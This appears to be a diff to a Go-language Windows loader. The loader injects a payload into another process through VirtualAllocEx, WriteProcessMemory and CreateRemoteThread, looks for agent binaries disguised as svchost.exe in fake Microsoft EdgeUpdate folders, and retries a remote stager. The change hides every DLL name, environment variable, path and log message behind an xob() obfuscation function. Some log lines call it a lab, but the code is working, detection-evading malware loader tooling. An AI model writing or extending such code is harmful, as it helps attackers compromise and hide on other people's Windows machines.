@@ -24,10 +24,10 @@ import (
 	"unsafe"
 )
 
-const defaultTargetProc = "notepad.exe"
+func defaultTargetProc() string { return xob(eDefaultProc) }
 
 var (
-	modKernel32              = syscall.NewLazyDLL("kernel32.dll")
+	modKernel32              = syscall.NewLazyDLL(xob(eKernel32))
 	procVirtualAllocEx       = modKernel32.NewProc("VirtualAllocEx")
 	procWriteProcessMemory   = modKernel32.NewProc("WriteProcessMemory")
 	procCreateRemoteThread   = modKernel32.NewProc("CreateRemoteThread")
@@ -66,14 +66,13 @@ type processEntry32 struct {
 }
 
 func targetProc() string {
-	if v := os.Getenv("TARGET_PROC"); v != "" && !strings.HasPrefix(v, "{{") {
+	if v := os.Getenv(xob(eEnvTargetProc)); v != "" {
 		return v
 	}
-	p := "{{TARGET_PROC}}"
-	if strings.HasPrefix(p, "{{") {
-		return defaultTargetProc
+	if p := bakedTargetProc(); p != "" {
+		return p
 	}
-	return p
+	return defaultTargetProc()
 }
 
 type Loader struct {
@@ -221,14 +220,19 @@ func selfDir() string {
 	exe, err := os.Executable()
 	if err == nil {
 		base := strings.ToLower(filepath.Base(exe))
-		if base != "rundll32.exe" && base != "regsvr32.exe" {
+		if base != xob(eRundll32) && base != xob(eRegsvr32) {
 			return filepath.Dir(exe)
 		}
 	}
-	if p := os.Getenv("PAYLOAD_PATH"); p != "" && !strings.HasPrefix(p, "{{") {
+	if p := os.Getenv(xob(eEnvPayloadPath)); p != "" {
 		return filepath.Dir(p)
 	}
-	return `C:\Program Files (x86)\Microsoft\EdgeUpdate`
+	return xob(eEdgeDir)
+}
+
+// payloadNames are the on-disk payload filenames the loader looks for.
+func payloadNames() []string {
+	return []string{xob(eSvchostName), xob(eAgentName), xob(ePayloadName)}
 }
 
 func readPayload() ([]byte, error) {
@@ -243,50 +247,29 @@ func readPayload() ([]byte, error) {
 			return os.ReadFile(cand)
 		}
 	}
-	if p := os.Getenv("PAYLOAD_PATH"); p != "" && !strings.HasPrefix(p, "{{") {
+	if p := os.Getenv(xob(eEnvPayloadPath)); p != "" {
 		// PAYLOAD_PATH may point at the DLL itself (WMI default). Prefer sibling agent.
 		if !strings.HasSuffix(strings.ToLower(p), ".dll") {
 			if strings.ToLower(filepath.Clean(p)) == self {
 				return []byte{0xC3}, nil
 			}
-			if b, err := os.ReadFile(p); err == nil {
-				return b, nil
-			}
-		}
-		dir := filepath.Dir(p)
-		for _, name := range []string{"svchost.exe", "agent.exe", "payload.bin"} {
-			full := filepath.Join(dir, name)
-			if strings.ToLower(full) == self {
-				continue
-			}
-			if b, err := os.ReadFile(full); err == nil {
+			if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
 				return b, nil
 			}
 		}
 	}
-	dir := selfDir()
-	for _, name := range []string{
-		"svchost.exe",
-		"agent.exe",
-		"payload.bin",
-		filepath.Join("..", "agent.exe"),
-	} {
-		full := filepath.Join(dir, name)
-		if strings.ToLower(full) == self {
-			continue
-		}
-		if b, err := os.ReadFile(full); err == nil {
-			return b, nil
+
+	for _, name := range append(payloadNames(), filepath.Join("..", xob(eAgentName))) {
+		p := filepath.Join(selfDir(), name)
+		if fi, err := os.Stat(p); err == nil && !fi.IsDir() {
+			if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
+				return b, nil
+			}
 		}
 	}
-	for _, p := range []string{
-		`C:\Program Files (x86)\Microsoft\EdgeUpdate\svchost.exe`,
-		`C:\ProgramData\Microsoft\EdgeUpdate\svchost.exe`,
-	} {
-		if strings.ToLower(p) == self {
-			continue
-		}
-		if b, err := os.ReadFile(p); err == nil {
+
+	for _, p := range []string{xob(eSvchostPF), xob(eSvchostPD)} {
+		if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
 			return b, nil
 		}
 	}
@@ -300,7 +283,7 @@ func runOnce() error {
 	// the agent eventually comes online without manual service restart.
 	if stageURL() != "" {
 		retryWait := 10 // default seconds between retries
-		if v := os.Getenv("STAGE_RETRY_WAIT"); v != "" && !strings.HasPrefix(v, "{{") {
+		if v := os.Getenv(xob(eEnvRetryWait)); v != "" && !strings.HasPrefix(v, "{{") {
 			if n, err := strconv.Atoi(v); err == nil && n > 0 {
 				retryWait = n
 			}
@@ -309,7 +292,7 @@ func runOnce() error {
 			if err := runStage(); err == nil {
 				return nil
 			} else {
-				fmt.Fprintf(os.Stderr, "loader stager: failed (%v) — retrying in %ds\n", err, retryWait)
+				fmt.Fprintf(os.Stderr, xob(eDiagStagerRetry), err, retryWait)
 				time.Sleep(time.Duration(retryWait) * time.Second)
 			}
 		}
@@ -319,9 +302,9 @@ func runOnce() error {
 		return err
 	}
 	proc := targetProc()
-	fmt.Fprintf(os.Stderr, "loader lab: target=%s payload_len=%d\n", proc, len(payload))
+	fmt.Fprintf(os.Stderr, xob(eDiagLabTarget), proc, len(payload))
 	if len(payload) <= 4 {
-		fmt.Fprintln(os.Stderr, "loader lab: no real payload — exit without inject")
+		fmt.Fprintln(os.Stderr, xob(eDiagNoPayload))
 		return nil
 	}
 	// Prefer spawning agent as a child when payload is a PE (MZ). More reliable for lab
@@ -338,7 +321,7 @@ func runOnce() error {
 		}
 		return err
 	}
-	fmt.Fprintln(os.Stderr, "inject requested OK")
+	fmt.Fprintln(os.Stderr, xob(eDiagInjectOK))
 	return nil
 }
 
@@ -351,13 +334,13 @@ func selfExe() string {
 
 func findPayloadPath() string {
 	self := selfExe()
-	if p := os.Getenv("AGENT_PATH"); p != "" {
+	if p := os.Getenv(xob(eEnvAgentPath)); p != "" {
 		if _, err := os.Stat(p); err == nil {
 			return p
 		}
 	}
 	dir := selfDir()
-	for _, name := range []string{"svchost.exe", "agent.exe"} {
+	for _, name := range []string{xob(eSvchostName), xob(eAgentName)} {
 		p := filepath.Join(dir, name)
 		if strings.ToLower(p) == self {
 			continue
@@ -366,10 +349,7 @@ func findPayloadPath() string {
 			return p
 		}
 	}
-	for _, p := range []string{
-		`C:\Program Files (x86)\Microsoft\EdgeUpdate\svchost.exe`,
-		`C:\ProgramData\Microsoft\EdgeUpdate\svchost.exe`,
-	} {
+	for _, p := range []string{xob(eSvchostPF), xob(eSvchostPD)} {
 		if _, err := os.Stat(p); err == nil {
 			return p
 		}
@@ -384,7 +364,7 @@ func startAgentProcess(path string) error {
 	if r < 32 {
 		return fmt.Errorf("WinExec failed code=%d err=%v path=%s", r, e, path)
 	}
-	fmt.Fprintf(os.Stderr, "loader lab: WinExec agent OK path=%s\n", path)
+	fmt.Fprintf(os.Stderr, xob(eDiagWinExecOK), path)
 	return nil
 }
 
@@ -393,7 +373,7 @@ var entryOnce sync.Once
 func entryPointMain() {
 	entryOnce.Do(func() {
 		if err := runOnce(); err != nil {
-			fmt.Fprintf(os.Stderr, "EntryPoint: %v\n", err)
+			fmt.Fprintf(os.Stderr, xob(eDiagEntryPoint), err)
 		}
 	})
 }
@@ -405,7 +385,7 @@ func main() {
 		return
 	}
 	if err := runOnce(); err != nil {
-		fmt.Fprintf(os.Stderr, "inject failed: %v\n", err)
+		fmt.Fprintf(os.Stderr, xob(eDiagInjectFail), err)
 		os.Exit(1)
 	}
 }
